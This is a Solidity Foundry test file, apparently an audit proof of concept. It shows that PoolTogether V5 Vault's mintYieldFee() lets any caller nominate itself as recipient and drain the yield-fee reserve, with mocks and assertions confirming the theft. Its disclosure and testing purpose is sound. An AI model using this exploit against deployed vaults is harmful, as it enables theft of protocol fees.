pragma solidity 0.8.17;

/*
  Foundry PoC for PoolTogether V5 Vault – mintYieldFee() broken access-control

  The test demonstrates that anybody can steal the whole fee reserve by calling
  `mintYieldFee()` and specifying a personal `_recipient`.  No protocol role
  or permission is required.

  The Vault has many external dependencies.  For the purpose of this PoC we
  provide ultra-light mocks so that only the code paths executed during the
  exploit are implemented.

  Running `forge test -vv` will compile and execute this file and prints the
  attacker’s newly minted share balance, proving the exploit.
*/

import "forge-std/Test.sol";

// --- OZ contracts -----------------------------------------------------------
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol";

// --- Real PoolTogether contracts -------------------------------------------
import {Vault}           from "src/Vault.sol";
import {PrizePool}       from "v5-prize-pool/PrizePool.sol";
import {TwabController}  from "v5-twab-controller/TwabController.sol";

// ===========================================================================
/*                              TWAB MOCK                                    */
// ===========================================================================
/*
  The Vault only reaches into three functions of TwabController when executing
  `mintYieldFee()`.  A minimal mock is sufficient.
*/
contract TwabControllerMock {
    // vault   =>  account => balance
    mapping(address => mapping(address => uint256)) internal _bal;
    // vault   =>  total supply
    mapping(address => uint256)                      internal _sup;

    // --- API identical to the real contract --------------------------------
    function mint(address _to, uint96 _amount) external {
        _bal[msg.sender][_to] += _amount;
        _sup[msg.sender]      += _amount;
    }

    function totalSupply(address _vault) external view returns (uint256) {
        return _sup[_vault];
    }

    function balanceOf(address _vault, address _account) external view returns (uint256) {
        return _bal[_vault][_account];
    }

    /* The following helpers are _not_ used by the PoC but are required to
       satisfy the Vault interface at compile-time.                           */
    function delegateOf(address, address) external pure returns (address) { return address(0); }
    function sponsor(address) external pure {}
    // constant from the real controller – irrelevant here
    address public constant SPONSORSHIP_ADDRESS = address(0xBEEF);
}

// ===========================================================================
/*                           YIELD VAULT MOCK                                */
// ===========================================================================

contract MockYieldVault is ERC4626 {
    constructor(IERC20 _asset) ERC20("MockYield", "MYLD") ERC4626(_asset) {}

    // Vault only calls `maxWithdraw()`
    function maxWithdraw(address) public view override returns (uint256) {
        return 0;
    }
}

// ===========================================================================
/*                              TEST HARNESS                                 */
// ===========================================================================
/*
  We create a tiny subclass of the real Vault that merely exposes the internal
  `_increaseYieldFeeBalance()` function so we can simulate an already accrued
  fee pot without needing to run the whole protocol machinery.
*/
contract VaultHarness is Vault {
    constructor(
        IERC20          _asset,
        string  memory  _name,
        string  memory  _symbol,
        TwabController  _twab,
        IERC4626        _yieldVault,
        PrizePool       _prizePool,
        address         _claimer,
        address         _yieldFeeRecipient,
        uint256         _yieldFeePercentage,
        address         _owner
    )
        Vault(
            _asset,
            _name,
            _symbol,
            _twab,
            _yieldVault,
            _prizePool,
            _claimer,
            _yieldFeeRecipient,
            _yieldFeePercentage,
            _owner
        )
    {}

    // helper to pre-fund the fee reserve
    function exposeIncreaseYieldFee(uint256 _shares) external {
        _increaseYieldFeeBalance(_shares);
    }
}

// ===========================================================================
/*                                   TEST                                     */
// ===========================================================================

contract Exploit_MintYieldFee_Test is Test {
    // actors
    address internal attacker = makeAddr("attacker");

    // contracts
    VaultHarness         internal vault;
    TwabControllerMock   internal twabImpl;
    ERC20                internal underlying;
    MockYieldVault       internal yieldVault;

    // constant – fee pot we are going to steal
    uint256 internal constant FEE_POT = 1e18;

    function setUp() public {
        // deploy mocks -------------------------------------------------------
        underlying = new ERC20("Mock USD", "mUSD");
        // pre-mint enough tokens so the constructor’s internal approvals don’t revert
        vm.deal(address(underlying), 1 ether); // dummy – balances are not used

        yieldVault = new MockYieldVault(underlying);
        twabImpl   = new TwabControllerMock();

        // We cannot deploy the Vault with `twabImpl` directly because the
        // Vault constructor parameter expects the *real* TwabController type.
        // Instead, we create a fresh address, copy the mock bytecode there
        // via `vm.etch`, and pass that address to the constructor.
        address twabAddr = address(0xBEEF);
        vm.etch(twabAddr, address(twabImpl).code);

        // dummy non-zero address for PrizePool (never touched during exploit)
        PrizePool fakePrizePool = PrizePool(address(0xCAFE));

        // deploy Vault
        vault = new VaultHarness(
            underlying,
            "Vault Share",
            "VSHARE",
            TwabController(twabAddr),
            yieldVault,
            fakePrizePool,
            address(0),          // claimer
            address(0xDEAD),     // legitimate fee recipient (will be robbed)
            0,                   // fee percentage – irrelevant
            address(this)        // owner
        );

        // pre-fund the fee reserve so there is something to steal ------------
        vault.exposeIncreaseYieldFee(FEE_POT);

        // label addresses for nicer traces
        vm.label(address(vault),     "Vault");
        vm.label(address(twabAddr),  "TwabControllerMock");
        vm.label(attacker,           "Attacker");
    }

    function testExploitMintYieldFee() public {
        // Sanity check – fee pot is in bookkeeping but **no real shares exist**
        assertEq(vault.yieldFeeTotalSupply(), FEE_POT, "pre-funded fee pot");
        assertEq(vault.totalSupply(),          0,      "no shares yet");

        // --------------------------------------------------------------------
        //                       >>>   EXPLOIT   <<<
        // Any account can call mintYieldFee() and nominate itself as recipient
        // --------------------------------------------------------------------
        vm.prank(attacker);
        vault.mintYieldFee(FEE_POT, attacker);

        // ----------------------  POST-CONDITIONS  ---------------------------
        // 1. fee pot has been emptied
        assertEq(vault.yieldFeeTotalSupply(), 0, "fee pot drained");

        // 2. attacker received real vault shares
        assertEq(vault.balanceOf(attacker), FEE_POT, "attacker balance");

        // 3. totalSupply increased accordingly
        assertEq(vault.totalSupply(), FEE_POT, "shares minted");

        emit log_named_uint("Attacker Vault Share Balance", vault.balanceOf(attacker));
    }
}
